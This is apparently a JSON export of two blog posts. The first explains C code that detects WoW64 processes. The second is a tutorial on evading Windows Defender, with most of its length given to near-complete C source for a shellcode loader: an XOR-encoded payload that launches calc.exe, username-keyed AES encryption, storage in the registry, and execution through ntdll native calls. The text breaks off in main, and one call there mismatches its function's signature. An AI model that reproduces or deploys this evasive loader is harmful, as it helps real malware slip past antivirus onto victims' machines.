[{"content":"WoW64 (Windows 32-bit on Windows 64-bit) is a subsystem within Microsoft Windows that lets Windows run 32-bit programs on 64-bit hardware.\nOne way to glean what processes are currently running in WoW64 mode is by querying NtQuerySystemInformation and checking whether IsWow64Process returns true or not.\nThis returns a pointer to a value that is set to TRUE if the process is running under WOW64 on an Intel64, x64, or ARM64 processor.\ntypedef NTSTATUS(NTAPI* PNtQuerySystemInformation)( ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength ); BOOL IsProcessWow64(HANDLE hProcess) { BOOL bIsWow64 = FALSE; FARPROC pIsWow64Process = GetProcAddress( GetModuleHandle(TEXT(\u0026#34;kernel32\u0026#34;)), \u0026#34;IsWow64Process\u0026#34;); if (pIsWow64Process) { ((BOOL(WINAPI*)(HANDLE, PBOOL))pIsWow64Process)(hProcess, \u0026amp;bIsWow64); } return bIsWow64; } With our type definition and the IsProcessWow64 function defined, we can implement the following logic in our main function like so: before doing anything, we pass GetCurrentProcess to our WoW64 check, thus checking whether the current process or environment we\u0026rsquo;re in is WoW64.\nWe then get a handle to ntdll, set up a do-while loop and a buffer to store queried process information, and then iterate over them via NextEntryOffset.\nIf the process is a normal 64-bit process, we simply print “x64,” the process name, and the related PID, like so: [x64] process.exe (PID: 1336).\nSimilarly, if the process returns true for the WOW64 check, we instead print WOW64, like so: [WOW64] process.exe (PID: 1337).\nWe iterate over the Windows process list after setting up a pointer to the process information buffer:\n// Iterate processes PSYSTEM_PROCESS_INFORMATION procInfo = (PSYSTEM_PROCESS_INFORMATION)buffer; while (procInfo-\u0026gt;NextEntryOffset) { HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)(ULONG_PTR)procInfo-\u0026gt;UniqueProcessId); // Iterate processes PSYSTEM_PROCESS_INFORMATION procInfo = (PSYSTEM_PROCESS_INFORMATION)buffer; while (procInfo-\u0026gt;NextEntryOffset) { HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)(ULONG_PTR)procInfo-\u0026gt;UniqueProcessId); For each unique process ID we see, we call OpenProcess which takes a \u0026ldquo;Desired Access\u0026rdquo; key represented by a DWORD, a BOOLEAN indicating whether or not to inherit the handle \u0026ndash; we set this to false \u0026ndash; and last, our process ID, represented by a DWORD.\nHANDLE OpenProcess( [in] DWORD dwDesiredAccess, [in] BOOL bInheritHandle, [in] DWORD dwProcessId ); The access level we want to use is PROCESS_QUERY_LIMITED_INFORMATION. This allows us to query processes from a standard user account without encountering errors, even when dealing with elevated system processes.\nUsing this method, in order to enumerate elevated processes, the binary must be run with elevated privileges.\nPutting it all together, we traverse the system process list via NextEntryOffset, part of the SYSTEM_PROCESS_INFORMATION structure \u0026ndash; checking each process ID against the WoW64 function, and then finally freeing our buffer and ntdll handle after completion.\nint main() { // Check if *this* program is running under WOW64 if (IsProcessWow64(GetCurrentProcess())) { printf(\u0026#34;[!] We appear to be running under WOW64 (32-bit on 64-bit Windows)\\n\\n\u0026#34;); } else { printf(\u0026#34;[*] We appear to be running as native 64-bit\\n\\n\u0026#34;); } // Load NtQuerySystemInformation HMODULE ntdll = LoadLibraryA(\u0026#34;ntdll.dll\u0026#34;); PNtQuerySystemInformation NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntdll, \u0026#34;NtQuerySystemInformation\u0026#34;); ULONG bufferSize = 0; NTSTATUS status; PVOID buffer = NULL; // Query process info do { if (buffer) free(buffer); buffer = malloc(bufferSize); status = NtQuerySystemInformation(5, buffer, bufferSize, \u0026amp;bufferSize); } while (status == 0xC0000004); // STATUS_INFO_LENGTH_MISMATCH // Iterate processes PSYSTEM_PROCESS_INFORMATION procInfo = (PSYSTEM_PROCESS_INFORMATION)buffer; while (procInfo-\u0026gt;NextEntryOffset) { HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)(ULONG_PTR)procInfo-\u0026gt;UniqueProcessId); if (hProcess) { BOOL isWow64 = IsProcessWow64(hProcess); CloseHandle(hProcess); printf(\u0026#34;[%s] %.*S (PID: %d)\\n\u0026#34;, isWow64 ? \u0026#34;WOW64\u0026#34; : \u0026#34;x64\u0026#34;, procInfo-\u0026gt;ImageName.Length / 2, procInfo-\u0026gt;ImageName.Buffer, (DWORD)(ULONG_PTR)procInfo-\u0026gt;UniqueProcessId); } procInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)procInfo + procInfo-\u0026gt;NextEntryOffset); } free(buffer); FreeLibrary(ntdll); return 0; } As seen below, one process is running in WoW64 mode on my vanilla Windows installation:\n//snipped [x64] vshost.exe (PID: 3300) [WOW64] vcpkgsrv.exe (PID: 7144) [x64] ServiceHub.Host.dotnet.x64.exe (PID: 7248) WoW64Search on Github\n","permalink":"https://hexagram.foo/posts/detecting-wow64-processes/","summary":"\u003cp\u003eWoW64 (Windows 32-bit on Windows 64-bit) is a subsystem within Microsoft Windows that lets Windows run 32-bit programs on 64-bit hardware.\u003c/p\u003e\n\u003cp\u003eOne way to glean what processes are currently running in WoW64 mode is by querying \u003ccode\u003eNtQuerySystemInformation\u003c/code\u003e and checking whether \u003ccode\u003eIsWow64Process\u003c/code\u003e returns true or not.\u003c/p\u003e\n\u003cp\u003eThis returns a pointer to a value that is set to TRUE if the process is running under WOW64 on an Intel64, x64, or ARM64 processor.\u003c/p\u003e","title":"Detecting WoW64 Processes"},{"content":"Lately I\u0026rsquo;ve been poking around at Windows internals and writing low level code. This morning I thought I\u0026rsquo;d try to bypass Windows Defender and get a low score on Virus Total.\nOne trick I’ve been playing with is writing shellcode to the Windows registry to keep things “fileless.” It’s not super fancy, but it’s kind of neat. I combined that with indirect syscalls and some cryptographic routines to get Windows Defender to chill out.\n\u0026ldquo;Syscalls\u0026rdquo; Windows gives each user-mode application a block of virtual addresses. This is known as the user space of that application. The other large block of addresses, known as system space or kernel space, cannot be directly accessed by the application.\nTo request a service from the kernel (like reading a file or opening a process), a usermode program must make a system call using the syscall instruction. This tells the kernel which function it needs by placing a System Service Number or SSN in the eax register.\nThe SSN is basically an index in a table known as the system service descriptor table, where each number points to a different kernel function. For example:\neax = 0 -\u0026gt; Calls the 1st function in the table eax = 1 -\u0026gt; Calls the 2nd function eax = 2 -\u0026gt; Calls the 3rd, and so on. The kernel finds the function using: function_address = SSDT_base + (System Service Number)\ntl;dr when a syscall instruction runs, the CPU switches from usermode to kernel mode, and the system call handler uses the system service number in eax to execute the correct function.\nUsermode functions then, in many cases, reach out to ntdll.dll, which in turn call into the kernel image, ntoskrnl.exe.\nImage from Microsoft Press Store by Pearson\nFor example, we can see this artifact here—if I write some code in userland that uses the following Win32 API functions, CreateFileA and WriteFile:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; int main() { char path[MAX_PATH]; char filename[MAX_PATH]; HANDLE hFile; DWORD bytesWritten; printf(\u0026#34;Enter the path: \u0026#34;); scanf(\u0026#34;%s\u0026#34;, path); printf(\u0026#34;Enter the filename: \u0026#34;); scanf(\u0026#34;%s\u0026#34;, filename); char fullPath[MAX_PATH]; snprintf(fullPath, sizeof(fullPath), \u0026#34;%s\\\\%s\u0026#34;, path, filename); hFile = CreateFileA(fullPath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { DWORD error = GetLastError(); LPVOID errorMsg; FormatMessageA( FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 0, (LPSTR)\u0026amp;errorMsg, 0, NULL ); printf(\u0026#34;Failed to create the file: %s\\n\u0026#34;, (char*)errorMsg); LocalFree(errorMsg); return 1; } const char* content = \u0026#34;Noted\u0026#34;; if (!WriteFile(hFile, content, strlen(content), \u0026amp;bytesWritten, NULL)) { printf(\u0026#34;Failed to write to the file.\\n\u0026#34;); CloseHandle(hFile); return 1; } CloseHandle(hFile); printf(\u0026#34;File created successfully: %s\\n\u0026#34;, fullPath); return 0; } This code uses the userland hooks CreateFileA and WriteFile. But if we compile this code and step through it in a debugger or decompiler, we\u0026rsquo;ll see something else: under the hood, these functions invoke NtCreateFile and NtWriteFile—Native API stubs in ntdll.dll that set up registers and issue the actual syscall.\nCreateFileA is a high-level wrapper over the Native API. It handles things like ANSI/unicode conversion, then delegates to NtCreateFile, which prepares the registers and triggers the syscall within ntoskrnl.exe.\nNt or Zw are system calls declared in ntdll.dll and ntoskrnl.exe. When called from ntdll.dll in user mode, these groups are almost exactly the same; they trap into kernel mode and call the equivalent function in ntoskrnl.exe via the SSDT. When calling the functions directly in ntoskrnl.exe (only possible in kernel mode), the Zw variants ensure kernel mode, whereas the Nt variants do not.\nSo, native calls reach out to the System Service Descriptor Table (SSDT), which holds an array of offsets to kernel system calls:\ntypedef struct tagSERVICE_DESCRIPTOR_TABLE { SYSTEM_SERVICE_TABLE nt; //effectively a pointer to Service Dispatch Table (SSDT) itself SYSTEM_SERVICE_TABLE win32k; SYSTEM_SERVICE_TABLE sst3; //pointer to a memory address that contains how many routines are defined in the table SYSTEM_SERVICE_TABLE sst4; } SERVICE_DESCRIPTOR_TABLE; So, calls to functions in ntdll.dll in turn get converted to low-level calls like ZwCreateFile and ZwWriteFile, courtesy of the index we pass to ntdll.dll and the syscall.\n//snipped mov r10,rcx | NtWriteFile mov eax,8 | test byte ptr ds:[7FFE0308],1 | jne ntdll.7FFF055AEE55 | syscall | ret In this blog post, we\u0026rsquo;ll use indirect syscalls which leverage native functions within ntdll.dll, avoiding certain calls to the Win32 API.\nSince ntdll.dll is available to every Windows process and provides the interface for user-mode programs to interact with kernel services, using system calls through ntdll.dll can help activity appear more legitimate.\nIf we bypassed ntdll.dll and directly called kernel functions, it could stick out, increasing the likelihood of being detected by security tools that monitor abnormal behavior.\nIn a future blog post, we\u0026rsquo;ll cover additional changes to our setup, including alternative approaches to enhancing stealth, such as unhooking.\nTypeDefs, For You and Me By default, Windows Defender and various telemetry heavily monitor most of the things that happen in userland. This is to say that using userland hooks to do anything interesting can make it stick out—in a bad way.\nTo improve our chances of flying under the radar, we can use some alternative userland functions and instead make calls using Native API functionality within ntdll.dll, which in turn make syscalls to the kernel.\nBut to do this, we\u0026rsquo;ll need some initial declarations. These are the type definitions we\u0026rsquo;ll use for Native API functions. We start with the _PS_ATTRIBUTE for process and thread creation1, along with unicode handling, process attributes, and identification for processes and threads.\nWe also define the types we’ll need for indirect calls to allocate memory2 and spin up new process threads3, which we\u0026rsquo;ll do using pNtAllocateVirtualMemory, pNtCreateThreadEx, and pNtWaitForSingleObject, respectively.\n#include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Lmcons.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;bcrypt.h\u0026gt; #pragma comment(lib, \u0026#34;bcrypt.lib\u0026#34;) typedef struct _PS_ATTRIBUTE { ULONG Attribute; SIZE_T Size; union { ULONG Value; PVOID ValuePtr; } u1; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE; typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST; typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID; // Define prototypes with proper calling convention typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)( HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect ); typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)( HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection ); typedef NTSTATUS(NTAPI* pNtCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList ); typedef NTSTATUS(NTAPI* pNtWaitForSingleObject)( HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout ); typedef NTSTATUS(NTAPI* pNtFreeVirtualMemory)( HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType ); typedef NTSTATUS(NTAPI* pNtClose)( HANDLE Handle ); // Function to get NTDLL function address PVOID GetNtdllFunction(LPCSTR FunctionName) { HMODULE hNtdll = GetModuleHandleA(\u0026#34;ntdll.dll\u0026#34;); if (!hNtdll) { return NULL; } return GetProcAddress(hNtdll, FunctionName); } To reiterate the point here: all of this is to avoid calling userland hooks that are more heavily monitored by telemetry products like Windows Defender. For example, the userland function CreateRemoteThread might stick out. That is, instead of calling the userland hook, we call pNtCreateThreadEx.\nfoo() Now that we have type definitions to use with some of our ntdll.dll calls later on, next we need shellcode and functions for encryption and execution. The shellcode is just a simple payload that launches calc.exe.\nSide note: I’ve already XOR’d the payload before embedding it in the program. We’ll reverse the XOR just before execution.\nSo, beyond our shellcode, we\u0026rsquo;ll use the following constructions: an AES encryption routine, an AES decryption routine, a reverse XOR routine, functions to read from and write to the Windows registry, and indirect system calls for allocating read-write-execute memory and spinning up new process threads.\nBut first, our AES routines. We generate our encryption key using the username of the current user. If the username is less than 16 characters, we just pad it with 0x01. We then follow the conventions for using the BCrypt API from Microsoft4.\nconst BYTE shellcode[] = { 0xb7, 0x03, 0xc8, 0xaf, 0xbb, 0xa3, 0x8b, 0x4b, 0x4b, 0x4b, 0x0a, 0x1a, 0x0a, 0x1b, 0x19, 0x1a, 0x1d, 0x03, 0x7a, 0x99, 0x2e, 0x03, 0xc0, 0x19, 0x2b, 0x03, 0xc0, 0x19, 0x53, 0x03, 0xc0, 0x19, 0x6b, 0x03, 0xc0, 0x39, 0x1b, 0x03, 0x44, 0xfc, 0x01, 0x01, 0x06, 0x7a, 0x82, 0x03, 0x7a, 0x8b, 0xe7, 0x77, 0x2a, 0x37, 0x49, 0x67, 0x6b, 0x0a, 0x8a, 0x82, 0x46, 0x0a, 0x4a, 0x8a, 0xa9, 0xa6, 0x19, 0x0a, 0x1a, 0x03, 0xc0, 0x19, 0x6b, 0xc0, 0x09, 0x77, 0x03, 0x4a, 0x9b, 0xc0, 0xcb, 0xc3, 0x4b, 0x4b, 0x4b, 0x03, 0xce, 0x8b, 0x3f, 0x2c, 0x03, 0x4a, 0x9b, 0x1b, 0xc0, 0x03, 0x53, 0x0f, 0xc0, 0x0b, 0x6b, 0x02, 0x4a, 0x9b, 0xa8, 0x1d, 0x03, 0xb4, 0x82, 0x0a, 0xc0, 0x7f, 0xc3, 0x03, 0x4a, 0x9d, 0x06, 0x7a, 0x82, 0x03, 0x7a, 0x8b, 0xe7, 0x0a, 0x8a, 0x82, 0x46, 0x0a, 0x4a, 0x8a, 0x73, 0xab, 0x3e, 0xba, 0x07, 0x48, 0x07, 0x6f, 0x43, 0x0e, 0x72, 0x9a, 0x3e, 0x93, 0x13, 0x0f, 0xc0, 0x0b, 0x6f, 0x02, 0x4a, 0x9b, 0x2d, 0x0a, 0xc0, 0x47, 0x03, 0x0f, 0xc0, 0x0b, 0x57, 0x02, 0x4a, 0x9b, 0x0a, 0xc0, 0x4f, 0xc3, 0x03, 0x4a, 0x9b, 0x0a, 0x13, 0x0a, 0x13, 0x15, 0x12, 0x11, 0x0a, 0x13, 0x0a, 0x12, 0x0a, 0x11, 0x03, 0xc8, 0xa7, 0x6b, 0x0a, 0x19, 0xb4, 0xab, 0x13, 0x0a, 0x12, 0x11, 0x03, 0xc0, 0x59, 0xa2, 0x1c, 0xb4, 0xb4, 0xb4, 0x16, 0x03, 0xf1, 0x4a, 0x4b, 0x4b, 0x4b, 0x4b, 0x4b, 0x4b, 0x4b, 0x03, 0xc6, 0xc6, 0x4a, 0x4a, 0x4b, 0x4b, 0x0a, 0xf1, 0x7a, 0xc0, 0x24, 0xcc, 0xb4, 0x9e, 0xf0, 0xbb, 0xfe, 0xe9, 0x1d, 0x0a, 0xf1, 0xed, 0xde, 0xf6, 0xd6, 0xb4, 0x9e, 0x03, 0xc8, 0x8f, 0x63, 0x77, 0x4d, 0x37, 0x41, 0xcb, 0xb0, 0xab, 0x3e, 0x4e, 0xf0, 0x0c, 0x58, 0x39, 0x24, 0x21, 0x4b, 0x12, 0x0a, 0xc2, 0x91, 0xb4, 0x9e, 0x28, 0x2a, 0x27, 0x28, 0x65, 0x2e, 0x33, 0x2e, 0x4b }; const DWORD shellcodeSize = sizeof(shellcode); // AES Configuration #define AES_KEY_LENGTH 16 // 128-bit AES #define AES_BLOCK_SIZE 16 // Helper function to generate encryption key from user environment BOOL GenerateKeyFromEnvironment(BYTE* key, DWORD keySize) { CHAR username[UNLEN + 1]; DWORD usernameLen = UNLEN + 1; if (!GetUserNameA(username, \u0026amp;usernameLen)) { printf(\u0026#34;Failed to get username: %d\\n\u0026#34;, GetLastError()); return FALSE; } BYTE padding = 0x01; for (DWORD i = 0; i \u0026lt; keySize; i++) { if (i \u0026lt; usernameLen) { key[i] = (BYTE)username[i]; } else { key[i] = padding++; } } return TRUE; } // AES Encryption Function BOOL AESEncrypt(const BYTE* plaintext, DWORD plaintextSize, const BYTE* key, BYTE** ciphertext, DWORD* ciphertextSize) { BCRYPT_ALG_HANDLE hAlgorithm = NULL; BCRYPT_KEY_HANDLE hKey = NULL; NTSTATUS status; // Open AES provider status = BCryptOpenAlgorithmProvider(\u0026amp;hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0); if (status != 0) { printf(\u0026#34;BCryptOpenAlgorithmProvider failed: 0x%x\\n\u0026#34;, status); return FALSE; } // Set ECB mode status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0); if (status != 0) { BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\u0026#34;BCryptSetProperty failed: 0x%x\\n\u0026#34;, status); return FALSE; } // Create key handle status = BCryptGenerateSymmetricKey(hAlgorithm, \u0026amp;hKey, NULL, 0, (BYTE*)key, AES_KEY_LENGTH, 0); if (status != 0) { BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\u0026#34;BCryptGenerateSymmetricKey failed: 0x%x\\n\u0026#34;, status); return FALSE; } // Get output buffer size DWORD cbCiphertext = 0; status = BCryptEncrypt(hKey, (BYTE*)plaintext, plaintextSize, NULL, NULL, 0, NULL, 0, \u0026amp;cbCiphertext, BCRYPT_BLOCK_PADDING); if (status != 0) { BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\u0026#34;BCryptEncrypt size check failed: 0x%x\\n\u0026#34;, status); return FALSE; } // Allocate ciphertext buffer *ciphertext = (BYTE*)malloc(cbCiphertext); if (!*ciphertext) { BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\u0026#34;Memory allocation failed\\n\u0026#34;); return FALSE; } // Perform encryption status = BCryptEncrypt(hKey, (BYTE*)plaintext, plaintextSize, NULL, NULL, 0, *ciphertext, cbCiphertext, ciphertextSize, BCRYPT_BLOCK_PADDING); if (status != 0) { free(*ciphertext); BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\u0026#34;BCryptEncrypt failed: 0x%x\\n\u0026#34;, status); return FALSE; } // Cleanup BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); return TRUE; } If all goes well, we succeed in deriving a key and encrypting the shellcode. But we also need an AES decryption routine. The use of AES routines to keep our payload safe further reduces the likelihood of Windows Defender catching us.\n// AES Decryption Function BOOL AESDecrypt(const BYTE* ciphertext, DWORD ciphertextSize, const BYTE* key, BYTE** plaintext, DWORD* plaintextSize) { BCRYPT_ALG_HANDLE hAlgorithm = NULL; BCRYPT_KEY_HANDLE hKey = NULL; NTSTATUS status; // Open AES provider status = BCryptOpenAlgorithmProvider(\u0026amp;hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0); if (status != 0) { printf(\u0026#34;BCryptOpenAlgorithmProvider failed: 0x%x\\n\u0026#34;, status); return FALSE; } // Set ECB mode status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0); if (status != 0) { BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\u0026#34;BCryptSetProperty failed: 0x%x\\n\u0026#34;, status); return FALSE; } // Create key handle status = BCryptGenerateSymmetricKey(hAlgorithm, \u0026amp;hKey, NULL, 0, (BYTE*)key, AES_KEY_LENGTH, 0); if (status != 0) { BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\u0026#34;BCryptGenerateSymmetricKey failed: 0x%x\\n\u0026#34;, status); return FALSE; } // Get output buffer size DWORD cbPlaintext = 0; status = BCryptDecrypt(hKey, (BYTE*)ciphertext, ciphertextSize, NULL, NULL, 0, NULL, 0, \u0026amp;cbPlaintext, BCRYPT_BLOCK_PADDING); if (status != 0) { BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\u0026#34;BCryptDecrypt size check failed: 0x%x\\n\u0026#34;, status); return FALSE; } // Allocate plaintext buffer *plaintext = (BYTE*)malloc(cbPlaintext); if (!*plaintext) { BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\u0026#34;Memory allocation failed\\n\u0026#34;); return FALSE; } // Perform decryption status = BCryptDecrypt(hKey, (BYTE*)ciphertext, ciphertextSize, NULL, NULL, 0, *plaintext, cbPlaintext, plaintextSize, BCRYPT_BLOCK_PADDING); if (status != 0) { free(*plaintext); BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\u0026#34;BCryptDecrypt failed: 0x%x\\n\u0026#34;, status); return FALSE; } // Cleanup BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); return TRUE; } However, even after this, we\u0026rsquo;ll make one final effort to subvert Windows Defender—namely, by writing our encrypted payload to the Windows registry, so as to remain stealthy, fileless, and potentially persistent.\nIn other words: we’re never writing to disk. Our shellcode lives only in memory, getting decrypted and XOR-decoded on the fly before execution.\nBut how can we perform reads and writes against the Windows registry? We\u0026rsquo;ll need to use the winreg API from Microsoft.5\nFirst we\u0026rsquo;ll make use of RegOpenKeyExA and RegSetValueExA since we want to write to the Window\u0026rsquo;s registry. But we need somewhere to write! And we want to write to Control Panel, under the current running user\u0026rsquo;s username.\nSo, before we read or write, we\u0026rsquo;ll get the username from the current environment and append it to the write operation under the HKEY Control Panel \u0026ndash; this way when we do write out, it will be within the registry key \\Control Panel\\Username under HKEY_CURRENT_USER.\nAnd afterward, we use RegQueryValueExA to do the opposite operation, querying and reading the registry key we\u0026rsquo;ve written.\nBOOL writeRegistry(const BYTE* data, DWORD dataSize, const char* valueName) { HKEY hKey; LONG status = RegOpenKeyExA(HKEY_CURRENT_USER, \u0026#34;Control Panel\u0026#34;, 0, KEY_SET_VALUE, \u0026amp;hKey); if (status != ERROR_SUCCESS) { printf(\u0026#34;Error opening key: %d\\n\u0026#34;, GetLastError()); return FALSE; } status = RegSetValueExA(hKey, valueName, 0, REG_BINARY, data, dataSize); RegCloseKey(hKey); if (status != ERROR_SUCCESS) { printf(\u0026#34;Error writing value: %d\\n\u0026#34;, GetLastError()); return FALSE; } return TRUE; } BOOL readRegistry(BYTE** buffer, DWORD* bytesRead, const char* valueName) { HKEY hKey; LONG status = RegOpenKeyExA(HKEY_CURRENT_USER, \u0026#34;Control Panel\u0026#34;, 0, KEY_READ, \u0026amp;hKey); if (status != ERROR_SUCCESS) { printf(\u0026#34;Error opening key: %d\\n\u0026#34;, GetLastError()); return FALSE; } DWORD type, size = 0; status = RegQueryValueExA(hKey, valueName, NULL, \u0026amp;type, NULL, \u0026amp;size); if (status != ERROR_SUCCESS) { RegCloseKey(hKey); printf(\u0026#34;Error querying value size: %d\\n\u0026#34;, GetLastError()); return FALSE; } *buffer = (BYTE*)malloc(size); if (!*buffer) { RegCloseKey(hKey); printf(\u0026#34;Memory allocation failed\\n\u0026#34;); return FALSE; } status = RegQueryValueExA(hKey, valueName, NULL, \u0026amp;type, *buffer, \u0026amp;size); RegCloseKey(hKey); if (status != ERROR_SUCCESS) { free(*buffer); printf(\u0026#34;Error reading value: %d\\n\u0026#34;, GetLastError()); return FALSE; } *bytesRead = size; return TRUE; } Before we wrap things up with our shellcode execution and main functions, we need a small gadget to decode the payload, since the payload in this script was one I XOR\u0026rsquo;d beforehand.\nvoid XORDecode(BYTE* data, DWORD dataSize, BYTE key) { for (DWORD i = 0; i \u0026lt; dataSize; i++) { data[i] ^= key; } } Alright, now we\u0026rsquo;re close. We need to make use of the type definitions for indirect syscalls we created earlier.\nWe get the function pointers to allocate and protect virtual memory, as well as to spin a new thread and wait for it to launch. And our epilogue will use the NtFreeVirtualMemory function to free our objects when we\u0026rsquo;re done.\nSo, fundamentally what we\u0026rsquo;re doing is dropping our now decrypted and XOR decoded shellcode into read-write-execute memory via ntdll calls for evasion. Lastly, our process spins up as a new thread in our current process\u0026ndash;then we wait for it to finish.\nAnd the resulting shellcode that\u0026rsquo;s launched starts calc.exe, effectively forking off from our current process. After this, we clean up our memory and bail out cleanly.\nvoid ExecuteShellcode(BYTE* shellcode, SIZE_T size) { XORDecode(shellcode, size, \u0026#39;K\u0026#39;); // Get function pointers pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetNtdllFunction(\u0026#34;NtAllocateVirtualMemory\u0026#34;); pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetNtdllFunction(\u0026#34;NtProtectVirtualMemory\u0026#34;); pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetNtdllFunction(\u0026#34;NtCreateThreadEx\u0026#34;); pNtWaitForSingleObject NtWaitForSingleObject = (pNtWaitForSingleObject)GetNtdllFunction(\u0026#34;NtWaitForSingleObject\u0026#34;); pNtFreeVirtualMemory NtFreeVirtualMemory = (pNtFreeVirtualMemory)GetNtdllFunction(\u0026#34;NtFreeVirtualMemory\u0026#34;); pNtClose NtClose = (pNtClose)GetNtdllFunction(\u0026#34;NtClose\u0026#34;); if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtCreateThreadEx || !NtWaitForSingleObject || !NtFreeVirtualMemory || !NtClose) { printf(\u0026#34;Failed to get NTDLL function pointers\\n\u0026#34;); return; } PVOID execMemory = NULL; SIZE_T regionSize = size; ULONG oldProtect; // Allocate memory NTSTATUS status = NtAllocateVirtualMemory( GetCurrentProcess(), \u0026amp;execMemory, 0, \u0026amp;regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ); if (status != 0) { printf(\u0026#34;NtAllocateVirtualMemory failed: 0x%x\\n\u0026#34;, status); return; } // Copy shellcode memcpy(execMemory, shellcode, size); // Change protection status = NtProtectVirtualMemory( GetCurrentProcess(), \u0026amp;execMemory, \u0026amp;size, PAGE_EXECUTE_READ, \u0026amp;oldProtect ); if (status != 0) { printf(\u0026#34;NtProtectVirtualMemory failed: 0x%x\\n\u0026#34;, status); NtFreeVirtualMemory(GetCurrentProcess(), \u0026amp;execMemory, \u0026amp;size, MEM_RELEASE); return; } // Create thread HANDLE hThread = NULL; status = NtCreateThreadEx( \u0026amp;hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)execMemory, NULL, 0, 0, 0, 0, NULL ); if (status != 0) { printf(\u0026#34;NtCreateThreadEx failed: 0x%x\\n\u0026#34;, status); NtFreeVirtualMemory(GetCurrentProcess(), \u0026amp;execMemory, \u0026amp;size, MEM_RELEASE); return; } // Wait for thread status = NtWaitForSingleObject(hThread, FALSE, NULL); if (status != 0) { printf(\u0026#34;NtWaitForSingleObject failed: 0x%x\\n\u0026#34;, status); } // Cleanup NtClose(hThread); NtFreeVirtualMemory(GetCurrentProcess(), \u0026amp;execMemory, \u0026amp;size, MEM_RELEASE); } So, to recap and tie all of it together.\nWe use the current username the process is running under as a cryptographic key for our AES routines to encrypt our shellcode and write this out to the Windows registry. Then we read it back out, performing decryption before calling the function to actually execute the shellcode. Finally, in ExecuteShellcode we reverse the XOR encoding just before copying the shellcode to executable memory and attempting to execute it. We spin up a new thread and wait with NtWaitForSingleObject \u0026ndash; if all goes well, we get a fresh calc.exe and Windows Defender doesn\u0026rsquo;t yell at us! int main() { BYTE key[AES_KEY_LENGTH]; if (!GenerateKeyFromEnvironment(key, AES_KEY_LENGTH)) { return 1; } // Encrypt payload BYTE* encryptedShellcode = NULL; DWORD encryptedSize = 0; if (!AESEncrypt(shellcode, shellcodeSize, key, \u0026amp;encryptedShellcode, \u0026amp;encryptedSize)) { return 1; } // Write to registry if (!writeRegistry(encryptedShellcode, encryptedSize)) { free(encryptedShellcode); return 1; } 